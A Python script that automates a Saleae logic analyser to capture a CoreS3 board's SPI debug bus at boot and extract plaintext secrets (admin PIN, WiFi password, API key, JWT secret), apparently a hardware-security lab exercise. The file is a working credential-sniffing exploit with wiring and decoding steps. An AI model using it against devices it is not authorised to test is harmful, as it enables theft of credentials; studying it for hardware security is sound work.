#!/usr/bin/env python3
"""
Saleae Logic 2 SPI Capture Script

Automates SPI capture on the CoreS3 debug logger bus using the Saleae
Logic 2 automation API. Reboots the device to trigger the SPI debug
logger emission, captures the transaction, decodes it, and displays
extracted secrets.

The SPI debug logger fires only at boot (not via bus-diag), so this
script always reboots the device to trigger the emission.

Requirements:
  - Saleae Logic 2 running with automation server enabled (port 10430)
  - pip install logic2-automation pyserial
  - Saleae connected:
      CH0=GPIO17(SCK), CH1=GPIO8(MOSI), CH2=GPIO9(MISO), CH3=GPIO18(CS)

Usage:
  python3 saleae_spi_capture.py --serial-port /dev/ttyACM0
  python3 saleae_spi_capture.py --serial-port /dev/ttyACM0 --output capture.csv
  python3 saleae_spi_capture.py --trigger manual
"""

import argparse
import csv
import os
import sys
import tempfile
import time

try:
    from saleae.automation import (
        Manager,
        CaptureConfiguration,
        LogicDeviceConfiguration,
        TimedCaptureMode,
    )
except ImportError:
    print("ERROR: saleae automation library not found.")
    print("Install with: pip install logic2-automation")
    sys.exit(1)

try:
    import serial
    HAS_SERIAL = True
except ImportError:
    HAS_SERIAL = False

SALEAE_PORT = 10430
# Channel assignments matching WIRING.txt
CH_SCK = 0   # GPIO17
CH_MOSI = 1  # GPIO8  - secrets are on this line
CH_MISO = 2  # GPIO9  - unused (write-only logger)
CH_CS = 3    # GPIO18
SAMPLE_RATE_HZ = 4_000_000  # 4 MHz (12x oversampling for 333kHz SPI)
CAPTURE_DURATION_S = 15.0   # 15 seconds covers full boot sequence


def connect_logic2(port=SALEAE_PORT, timeout=10.0):
    """Connect to a running Logic 2 instance."""
    print(f"Connecting to Logic 2 on port {port}...")
    try:
        manager = Manager(port=port, connect_timeout_seconds=timeout)
        info = manager.get_app_info()
        print(f"Connected to Logic 2 v{info.app_version}")
        return manager
    except Exception as e:
        print(f"ERROR: Could not connect to Logic 2: {e}")
        print()
        print("Make sure Logic 2 is running with the automation server enabled:")
        print("  Logic 2 -> Preferences -> Enable automation server on port 10430")
        sys.exit(1)


def find_device(manager):
    """Find the connected Saleae device."""
    devices = manager.get_devices(include_simulation_devices=False)
    if not devices:
        print("ERROR: No Saleae devices found.")
        sys.exit(1)

    device = devices[0]
    print(f"Using device: {device.device_type} (ID: {device.device_id})")
    return device


def trigger_reboot(serial_port, baud=115200):
    """Send reboot command over serial."""
    if not HAS_SERIAL:
        print("ERROR: pyserial not installed. Install with: pip install pyserial")
        return False

    print(f"Sending 'reboot' via {serial_port}...")
    try:
        ser = serial.Serial(serial_port, baud, timeout=2)
        time.sleep(0.5)
        ser.write(b"\r\nreboot\r\n")
        time.sleep(0.5)
        ser.close()
        print("  Reboot command sent. SPI logger fires ~7s after reset.")
        return True
    except Exception as e:
        print(f"  WARNING: Serial error: {e}")
        return False


def capture_spi(manager, device, duration=CAPTURE_DURATION_S):
    """Start SPI capture."""
    print(f"Starting capture ({duration}s, {SAMPLE_RATE_HZ/1e6:.0f} MHz)...")
    print(f"  CH{CH_SCK}  = SCK  (GPIO17)")
    print(f"  CH{CH_MOSI} = MOSI (GPIO8) - secrets")
    print(f"  CH{CH_MISO} = MISO (GPIO9)")
    print(f"  CH{CH_CS}   = CS   (GPIO18)")

    device_config = LogicDeviceConfiguration(
        enabled_digital_channels=[CH_SCK, CH_MOSI, CH_MISO, CH_CS],
        digital_sample_rate=SAMPLE_RATE_HZ,
    )

    capture_config = CaptureConfiguration(
        capture_mode=TimedCaptureMode(duration_seconds=duration),
    )

    capture = manager.start_capture(
        device_configuration=device_config,
        device_id=device.device_id,
        capture_configuration=capture_config,
    )

    return capture


def decode_spi_export(csv_path):
    """Parse exported SPI analyzer CSV and extract MOSI payload.

    Saleae Logic 2 exports SPI data with columns:
      name, type, start_time, duration, miso, mosi

    Data bytes are exported as ASCII characters (e.g., 'a' for 0x61).
    Null bytes appear as '\\0'.
    """
    mosi_bytes = []

    with open(csv_path, "r", newline="") as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row.get("type", "").strip() != "result":
                continue
            mosi_val = row.get("mosi", "")
            if not mosi_val:
                continue
            if mosi_val == "\\0":
                mosi_bytes.append(0)
            elif len(mosi_val) == 1:
                mosi_bytes.append(ord(mosi_val))
            elif mosi_val.startswith("0x"):
                try:
                    mosi_bytes.append(int(mosi_val, 16))
                except ValueError:
                    pass

    return mosi_bytes


def display_results(mosi_bytes):
    """Display decoded SPI data and extract secrets."""
    if not mosi_bytes:
        print("\nNo SPI data captured on MOSI.")
        print("Check wiring: CH0=GPIO17(SCK), CH1=GPIO8(MOSI), CH3=GPIO18(CS)")
        print("Note: SPI debug logger fires at boot only - use reboot trigger.")
        return False

    hex_str = " ".join(f"{b:02X}" for b in mosi_bytes)
    ascii_str = "".join(chr(b) if 0x20 <= b <= 0x7E else "." for b in mosi_bytes)

    print(f"\nCaptured {len(mosi_bytes)} MOSI bytes:")
    print(f"  Hex:   {hex_str}")
    print(f"  ASCII: {ascii_str}")

    # Extract secrets from semicolon-delimited key=value pairs
    if "admin_pin=" in ascii_str or "wifi_pass=" in ascii_str:
        print()
        print("*** SECRETS FOUND ***")
        for part in ascii_str.split(";"):
            if "=" in part:
                key, _, value = part.partition("=")
                print(f"  {key}: {value}")

        print()
        print("SUCCESS: Extracted secrets from SPI debug logger!")
        print("The admin PIN, WiFi password, API key, and JWT secret were")
        print("transmitted in plaintext over the SPI bus during boot.")
        return True
    else:
        print("\nNo secrets pattern found in MOSI data.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Capture SPI debug logger secrets from CoreS3 using Saleae Logic 2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Wiring:
  Saleae CH0 -> GPIO17 (SCK)  - Pin 16 RIGHT on expansion header
  Saleae CH1 -> GPIO8  (MOSI) - Pin 4 RIGHT (secrets on this line)
  Saleae CH2 -> GPIO9  (MISO) - Pin 10 RIGHT (unused)
  Saleae CH3 -> GPIO18 (CS)   - Pin 15 LEFT on expansion header
  Saleae GND -> GND

Examples:
  %(prog)s --serial-port /dev/ttyACM0
  %(prog)s --trigger manual
  %(prog)s --output spi_capture.csv
""")
    parser.add_argument("--trigger", choices=["reboot", "manual"],
                        default="reboot",
                        help="How to trigger SPI emission (default: reboot)")
    parser.add_argument("--serial-port", default="/dev/ttyACM0",
                        help="Serial port for device (default: /dev/ttyACM0)")
    parser.add_argument("--baud", type=int, default=115200,
                        help="Serial baud rate (default: 115200)")
    parser.add_argument("--duration", type=float, default=CAPTURE_DURATION_S,
                        help=f"Capture duration in seconds (default: {CAPTURE_DURATION_S})")
    parser.add_argument("--port", type=int, default=SALEAE_PORT,
                        help=f"Logic 2 automation port (default: {SALEAE_PORT})")
    parser.add_argument("--output", "-o",
                        help="Save raw CSV export to this file")

    args = parser.parse_args()

    manager = connect_logic2(port=args.port)

    try:
        device = find_device(manager)
        capture = capture_spi(manager, device, duration=args.duration)

        time.sleep(1)

        if args.trigger == "reboot":
            trigger_reboot(args.serial_port, args.baud)
        else:
            print()
            print("MANUAL MODE: Trigger SPI emission now!")
            print("  Press the reset button on the device.")
            print(f"  Capture will run for {args.duration} seconds...")

        print("Capturing...")
        capture.wait()
        print("Capture complete.")

        # Add SPI analyzer
        print("Adding SPI protocol decoder...")
        spi_analyzer = capture.add_analyzer(
            "SPI",
            label="SPI Debug Logger",
            settings={
                "MISO": CH_MISO,
                "MOSI": CH_MOSI,
                "Clock": CH_SCK,
                "Enable": CH_CS,
                "Bits per Transfer": "8 Bits per Transfer (Standard)",
                "Significant Bit": "Most Significant Bit First (Standard)",
                "Clock State": "Clock is Low when inactive (CPOL = 0)",
                "Clock Phase": "Data is Valid on Clock Leading Edge (CPHA = 0)",
                "Enable Line": "Enable line is Active Low (Standard)",
            }
        )

        csv_path = args.output or os.path.join(
            tempfile.mkdtemp(), "spi_capture.csv"
        )
        print(f"Exporting decoded SPI data to {csv_path}...")
        capture.export_data_table(
            filepath=csv_path,
            analyzers=[spi_analyzer],
        )

        mosi_bytes = decode_spi_export(csv_path)
        display_results(mosi_bytes)

        if not args.output and os.path.exists(csv_path):
            print(f"\nRaw CSV saved at: {csv_path}")

    finally:
        manager.close()


if __name__ == "__main__":
    main()
